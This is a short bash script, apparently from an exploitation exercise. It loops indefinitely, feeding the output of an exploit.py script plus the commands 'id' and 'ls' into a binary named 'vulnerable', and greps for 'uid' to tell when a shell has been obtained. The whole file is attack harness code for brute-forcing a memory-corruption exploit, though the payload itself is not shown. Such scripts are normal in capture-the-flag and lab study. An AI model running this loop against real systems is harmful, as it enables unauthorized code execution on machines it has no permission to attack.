#!/usr/bin/bash -p
while true; 
do 

  (./exploit.py ; echo id; echo ls) | ./vulnerable | grep 'uid' -A 10 | tr 'A' ' ' ; 

done
